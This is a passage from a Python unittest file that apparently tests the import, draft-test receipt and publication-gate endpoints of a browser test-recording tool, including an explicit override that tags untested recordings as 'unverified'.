        self.assertEqual(plan.json()['candidates'][0]['name'], 'username')
        # A missing project must fail before anything is written.
        missing = client.post('/api/imports/variables', json={'project_id': '', 'steps': steps,
                                                             'assignments': [{'name': 'username', 'value': 'Ada'}]})
        self.assertEqual(missing.status_code, 422)

    def test_UT_IMP_44_plan_catalog_is_one_cached_read(self):
        client = TestClient(app)
        first = client.get('/api/plans/catalog')
        self.assertEqual(first.status_code, 200, first.text)
        payload = first.json()
        self.assertIn('recordings', payload)
        self.assertIn('projects', payload)
        self.assertIn('recording_defaults', payload)
        cached = client.get('/api/plans/catalog').json()
        self.assertEqual(cached['generated_at'], payload['generated_at'])


def fake_run_plan(status='passed'):
    """Stand in for the browser: the draft worker's own result shaping, no Chromium.

    The real draft test needs a browser; these regressions are about the receipt
    and the publication gate around it, not about replaying steps.
    """
    async def run(plan, values, artifact_dir, **options):
        Path(artifact_dir).mkdir(parents=True, exist_ok=True)
        total = len(plan['dataset']) * len(plan['matrix'])
        cases = [{'case': i + 1, 'row': 1, 'browser': 'chromium', 'device': 'desktop',
                  'status': status,
                  'attempts': [{'attempt': 1, 'status': status,
                                'steps': [{'stage': 'steps', 'step': n + 1, 'repeat': 1,
                                           'action': step['action'], 'status': status}
                                          for n, step in enumerate(plan['steps'])]}]}
                 for i in range(total)]
        return {'status': status, 'cases': cases, 'total': total, 'sequential': True}
    return run


class PublicationGateTests(unittest.TestCase):
    """PASS -> SAVE TO LIBRARY, receipt recovery, and the explicit override."""

    def draft(self, client, project_id, steps, name='Imported greeting', plan=None, status='passed'):
        """Run a draft test to a terminal state and return its receipt."""
        from app import import_drafts
        body = {'project_id': project_id, 'name': name, 'tags': 'imported', 'steps': steps}
        if plan is not None:
            body['execution_plan'] = plan
        with patch.object(import_drafts, 'run_plan', fake_run_plan(status)):
            started = client.post('/api/imports/test', json=body)
            self.assertEqual(started.status_code, 202, started.text)
            draft_id = started.json()['id']
            for _ in range(400):
                receipt = client.get('/api/imports/tests/' + draft_id).json()
                if receipt['status'] not in {'queued', 'running'}:
                    break
        self.assertEqual(receipt['status'], status, receipt)
        return body, receipt

    def test_UT_IMP_45_passing_receipt_is_listed_and_restorable(self):
        from app import import_drafts
        project = library_store.create_project('Receipt recovery', 'http://example.test')
        other = library_store.create_project('Another project', 'http://example.test')
        preview = parse_file('greeting.csv', CSV)
        self.assertTrue(preview['can_save'], preview['diagnostics'])
        with TestClient(app) as client, patch.object(library_store, '_finish', return_value=False):
            body, receipt = self.draft(client, project['id'], preview['steps'])
            # The panel keeps its draft in component state, which React discards on
            # a tab switch; this listing is how it gets the passing test back.
            listed = client.get('/api/imports/tests', params={'project_id': project['id']})
            self.assertEqual(listed.status_code, 200, listed.text)
            rows = listed.json()['drafts']
            self.assertEqual([row['id'] for row in rows], [receipt['id']])
            self.assertEqual(rows[0]['status'], 'passed')
            self.assertEqual(rows[0]['name'], 'Imported greeting')
            self.assertEqual(rows[0]['project_id'], project['id'])
            self.assertGreater(rows[0]['expires_in_seconds'], 3000)
            # A listing carries a summary, not every case of every attempt.
            self.assertNotIn('result', rows[0])
            self.assertEqual(rows[0]['summary'], {'total': 1, 'passed': 1, 'failed': 0})
            # Another project must not see this receipt.
            self.assertEqual(client.get('/api/imports/tests',
                                        params={'project_id': other['id']}).json()['drafts'], [])
            # The tested plan is what lets a reloaded panel rebuild a save payload
            # that still fingerprints identically.
            detail = client.get('/api/imports/tests/' + receipt['id'], params={'plan': 'true'}).json()
            self.assertEqual([s['action'] for s in detail['plan']['steps']],
                             [s['action'] for s in preview['steps']])
            # ...and it is left out of the twice-a-second polling response.
            self.assertNotIn('plan', client.get('/api/imports/tests/' + receipt['id']).json())
            # The receipt is readable from disk, not only from the worker's memory:
            # that is the state the panel is in after a reload.
            import_drafts._active = None
            saved = client.post('/api/imports/save', json={**body, 'draft_id': receipt['id'],
                                                           'require_test': True})
            self.assertEqual(saved.status_code, 201, saved.text)
            self.assertTrue(saved.json()['tested'])
            self.assertFalse(saved.json().get('unverified'))

    def test_UT_IMP_46_refusals_name_their_cause(self):
        project = library_store.create_project('Refusal wording', 'http://example.test')
        preview = parse_file('greeting.csv', CSV)
        with TestClient(app) as client, patch.object(library_store, '_finish', return_value=False):
            body, failed = self.draft(client, project['id'], preview['steps'], status='failed')
            response = client.post('/api/imports/save', json={**body, 'draft_id': failed['id']})
            self.assertEqual(response.status_code, 422, response.text)
            # "A passing test is required" told a user whose test had passed that
            # the gate was broken; each cause now says what to do instead.
            self.assertIn("'failed', not 'passed'", response.json()['detail'])
            # Editing the inputs after a pass invalidates the receipt, and says so.
            _body, passed = self.draft(client, project['id'], preview['steps'])
            edited = {**body, 'steps': normalize_steps(preview['steps'][:-1]),
                      'draft_id': passed['id']}
            response = client.post('/api/imports/save', json=edited)
            self.assertEqual(response.status_code, 422, response.text)
            self.assertIn('changed since that test passed', response.json()['detail'])
            # A receipt belongs to the project it was tested against.
            other = library_store.create_project('Wrong project', 'http://example.test')
            response = client.post('/api/imports/save', json={**body, 'project_id': other['id'],
                                                              'draft_id': passed['id']})
            self.assertEqual(response.status_code, 422, response.text)
            self.assertIn('different project', response.json()['detail'])

    def test_UT_IMP_47_unverified_override_is_explicit_and_marked(self):
        project = library_store.create_project('Override save', 'http://example.test')
        preview = parse_file('greeting.csv', CSV)
        # _publish_unlocked rather than _finish: _finish also rewrites catalog.json,
        # and a listing test that mocks the catalog write would prove nothing.
        with TestClient(app) as client, patch.object(library_store, '_publish_unlocked', return_value=False):
            body, failed = self.draft(client, project['id'], preview['steps'], status='failed')
            # No reason, no save: the override has to be asked for in words.
            refused = client.post('/api/imports/save', json={**body, 'allow_untested': True})
            self.assertEqual(refused.status_code, 422, refused.text)
            self.assertIn('override_reason', refused.json()['detail'])
            self.assertEqual(library_store.list_recordings(project['id']), [])
            # require_test:false is still not a bypass (UT-PLAN-12).
            self.assertEqual(client.post('/api/imports/save',
                                         json={**body, 'require_test': False}).status_code, 422)
            saved = client.post('/api/imports/save', json={**body, 'draft_id': failed['id'],
                                                           'allow_untested': True,
                                                           'override_reason': 'Target UAT env is down'})
            self.assertEqual(saved.status_code, 201, saved.text)
            payload = saved.json()
            self.assertTrue(payload['unverified'])
            self.assertFalse(payload['tested'])
            self.assertEqual(payload['override_reason'], 'Target UAT env is down')
            self.assertEqual(payload['draft_status'], 'failed')
            self.assertIn(library_store.UNVERIFIED_TAG, payload['tags'])
            self.assertEqual(payload['step_count'], 4)
            # The marker travels with the recording into every library view.
            self.assertTrue(library_store.get_recording(payload['id'])['unverified'])
            self.assertTrue(library_store.list_recordings(project['id'])[0]['unverified'])
            listed = client.get('/api/library/recordings').json()
            row = next(item for item in listed if item['id'] == payload['id'])
            self.assertTrue(row['unverified'])
            self.assertEqual(row['tags'], payload['tags'])
            fast = client.get(f"/api/projects/{project['id']}/recordings",
                              params={'fast': 'true'}).json()
            self.assertTrue(next(item for item in fast if item['id'] == payload['id'])['unverified'])
            self.assertTrue(next(item for item in client.get('/api/plans/catalog').json()['recordings']
                                 if item['id'] == payload['id'])['unverified'])
            # The uploaded source is still never executed: only canonical steps land.
            self.assertEqual([s['action'] for s in library_store.get_recording(payload['id'])['steps']],
                             ['navigate', 'fill', 'click', 'assert_text'])

    def test_UT_IMP_48_library_listing_keeps_tags_parent_and_url(self):
        """The catalog fast path used to drop the fields the catalog stores."""
        project = library_store.create_project('Listing shape', 'http://example.test')
        parent = library_store.create_recording(project['id'], 'Parent', 'http://example.test/a',
                                                tags='smoke,imported')
        child = library_store.create_recording(project['id'], 'Child', 'http://example.test/b',
                                               parent_id=parent['id'], tags='regression')
        with TestClient(app) as client:
            # The catalog exists now, so both readers take the fast path.
            self.assertTrue((library_store.library_dir() / 'catalog.json').is_file())
            rows = {row['id']: row for row in library_store.list_recordings(project['id'])}
            self.assertEqual(rows[parent['id']]['tags'], 'smoke,imported')
            self.assertEqual(rows[parent['id']]['start_url'], 'http://example.test/a')
            self.assertIsNone(rows[parent['id']]['parent_id'])
            self.assertEqual(rows[child['id']]['parent_id'], parent['id'])
            self.assertEqual(rows[child['id']]['start_url'], 'http://example.test/b')
            self.assertFalse(rows[child['id']]['unverified'])
            # The API and the store must not disagree about the same recording.
            for endpoint in (f"/api/projects/{project['id']}/recordings",
                             '/api/library/recordings'):
                listed = {row['id']: row for row in client.get(endpoint).json()}
                for rid in (parent['id'], child['id']):
                    self.assertEqual(listed[rid]['tags'], rows[rid]['tags'], endpoint)
                    self.assertEqual(listed[rid]['start_url'], rows[rid]['start_url'], endpoint)
                    self.assertEqual(listed[rid]['parent_id'], rows[rid]['parent_id'], endpoint)

    def test_UT_IMP_49_unverified_tag_helpers(self):
        self.assertTrue(library_store.is_unverified('imported,unverified'))
        self.assertTrue(library_store.is_unverified('UNVERIFIED'))
        self.assertFalse(library_store.is_unverified('imported,smoke'))
        self.assertFalse(library_store.is_unverified(''))
        self.assertFalse(library_store.is_unverified(None))
        self.assertEqual(library_store.mark_unverified('imported'), 'imported,unverified')
        self.assertEqual(library_store.mark_unverified('imported,unverified'), 'imported,unverified')
        self.assertEqual(library_store.mark_unverified(''), 'unverified')


if __name__ == '__main__':
    unittest.main(verbosity=2)
